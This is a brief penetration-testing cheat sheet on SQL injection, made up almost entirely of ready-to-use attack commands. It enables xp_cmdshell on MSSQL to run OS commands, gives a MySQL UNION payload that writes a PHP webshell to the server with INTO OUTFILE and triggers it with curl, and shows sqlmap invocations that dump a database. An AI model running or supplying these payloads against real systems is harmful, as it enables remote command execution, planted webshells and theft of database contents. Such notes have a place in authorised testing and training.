# SQLi

## MSSQL 

```
impacket-mssqlclient account:passwd@ip -windows-auth

SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
```

## MySQL

Injection:
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, ..., null INTO OUTFILE "/path/on/target/webshell.php" -- //
```
and trigger the webshell:
```
curl $TargetIp/path/on/target/webshell.php?cmd=ls
```

## sqlmap

```
sqlmap -u http://ip/page.php?user=dummy -p user
sqlmap -u http://ip/page.php?user=dummy -p user --dump
```


